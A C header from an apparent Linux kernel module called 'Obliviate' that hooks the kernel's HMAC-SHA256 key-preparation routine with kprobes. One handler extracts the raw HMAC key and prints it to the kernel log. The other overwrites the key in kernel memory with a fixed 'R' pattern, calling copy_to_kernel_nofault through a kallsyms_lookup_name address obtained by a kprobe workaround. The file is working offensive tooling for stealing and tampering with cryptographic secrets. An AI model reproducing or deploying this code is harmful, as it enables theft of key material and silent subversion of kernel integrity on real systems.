#ifndef OBLIVIATE_HMAC_HELPERS_H
#define OBLIVIATE_HMAC_HELPERS_H

#include "headers/main_header.h"

#if REVEAL_THE_HMAC_KEY
static int extract_key_prehandler(struct kprobe *kps, struct pt_regs *regs);
#endif
#if CHANGE_THE_HMAC_KEY
static int change_key_prehandler(struct kprobe *kps, struct pt_regs *regs);
#endif

#if (REVEAL_THE_HMAC_KEY || CHANGE_THE_HMAC_KEY)
static struct kprobe kp = {
    .symbol_name = "__hmac_sha256_preparekey",
    #if REVEAL_THE_HMAC_KEY
    .pre_handler = extract_key_prehandler,
    #endif
    #if CHANGE_THE_HMAC_KEY
    .pre_handler = change_key_prehandler,
    #endif
};
#endif

/*
*   | This is the code block that extracts the HMAC SHA-256 raw key. |
*/
#if REVEAL_THE_HMAC_KEY
static int extract_key_prehandler(struct kprobe *kps, struct pt_regs *regs){
    if(!kps || !regs){
        return 0; // negative error codes can be issue on older kernels.
    }

    /*
    *   Observation(for myself).
    *       - when use `zero initialized buffer` assembly looks like this
    *           mov qword [var_48h], 0 ; 
    *           mov qword [var_40h], 0
    *           mov qword [var_38h], 0
    *           - - -
    *           mov qword [var_10h], 0 ; totally 8 times
    *       - But if we use memset, compiler generate assembly looks like this
    *           rep stosq qword [rdi], rax
    *
    *       - Just a few bytes on memset, 
    *            but in here I choose the 8 bytes stores way.
    *       - reason is I actually didn't benchmark this, 
    *            and no idea about the dependent factors. 
    *       - And goal is not fix critical performance hit.
    */
    u8 local_buffer[O_MAX_SIZE] = {0};
    u8 * raw_key = NULL;
    size_t raw_key_len = 0;
    long ret = 0;

    raw_key = (unsigned char *)regs_get_kernel_argument(regs, 2);
    raw_key_len = (size_t)regs_get_kernel_argument(regs, 3);

    if(IS_ERR_OR_NULL(raw_key))
        return 0;

    if(unlikely(raw_key_len == 0 || raw_key_len > O_MAX_SIZE))
        return 0;

    ret = copy_from_kernel_nofault(local_buffer, raw_key, raw_key_len);
    if(ret != 0)
        return 0;

    pr_info("Raw HMAC Key: %*ph \n", (int)raw_key_len, local_buffer);
    // wipe out the key
    memzero_explicit(local_buffer, raw_key_len);

    return 0;
}
NOKPROBE_SYMBOL(extract_key_prehandler);
#endif
/*
*   | End of the key extraction |
*/

#if CHANGE_THE_HMAC_KEY
static int change_key_prehandler(struct kprobe *kps, struct pt_regs *regs){
    if(!kps || !regs)
        return 0;

    /*
    *   Zero runtime overhead.
    *   ex:
    *       - movabs rax, 0x5252525252525252 ; 'RRRRRRRR'
    */
    u8 local_buffer[O_MAX_SIZE] = {[0 ... (O_MAX_SIZE -1)] = 'R' }; // Never randomize this every iteration; it will break the design.
    u8 *raw_key = NULL;
    size_t raw_key_len = 0;
    long ret = 0;
    kallsyms_lookup_name_t local_copy_kallsyms = NULL;
    long (*my_copy_to_kernel_nofault)(void *, const void *, size_t);

    raw_key = (u8 *)regs_get_kernel_argument(regs, 2);
    raw_key_len = (size_t)regs_get_kernel_argument(regs, 3);
    local_copy_kallsyms = READ_ONCE(my_kallsyms_lookup_name);

    if(IS_ERR_OR_NULL(raw_key) || IS_ERR_OR_NULL(local_copy_kallsyms))
        return 0;

    if(raw_key_len == 0 || raw_key_len > O_MAX_SIZE)
        return 0;

    my_copy_to_kernel_nofault = (long(*)(void *, const void *, size_t))local_copy_kallsyms("copy_to_kernel_nofault");
    if(!my_copy_to_kernel_nofault)
        return 0;

    // rm if needed
    pr_info("[Obliviate]: wand points to memory and said obliviate!\n");
    ret = my_copy_to_kernel_nofault(raw_key, local_buffer, raw_key_len);
    if(ret != 0)
        return 0;

    memzero_explicit(local_buffer, O_MAX_SIZE);

    return 0;

}
NOKPROBE_SYMBOL(change_key_prehandler);
#endif

/*
*   | registration & unregistration section |
*/
#if (REVEAL_THE_HMAC_KEY || CHANGE_THE_HMAC_KEY)
static inline int register_extract_or_change_key_kprobe(void){
    int ret = 0;

    ret = register_kprobe(&kp);
    if(!ret)
        WRITE_ONCE(probe_hooked, true);

    return ret;
}

static inline void unregister_extract_or_change_key_kprobe(void){
    if(READ_ONCE(probe_hooked)){
        unregister_kprobe(&kp);
    }
}
#endif

#if (!REVEAL_THE_HMAC_KEY || !REVEAL_THE_AES_KEY)
/*
*   - After the init function completes, we can't reassign the address.
*   - That's why, if this fails, we stop early.
*
*   - failure cases
*       - Some kernels blacklist this kprobe.
*/
static inline int resolve_the_kallsyms(void){
    int ret;

    struct kprobe my_kp = {
        .symbol_name = "kallsyms_lookup_name",
    };

    ret = register_kprobe(&my_kp);
    if(ret < 0)
        return ret;

    if(unlikely(!my_kp.addr)){
        unregister_kprobe(&my_kp);
        return -EFAULT;
    }

    WRITE_ONCE(my_kallsyms_lookup_name, (kallsyms_lookup_name_t)my_kp.addr);
    unregister_kprobe(&my_kp);

    return 0;
}
#endif

#endif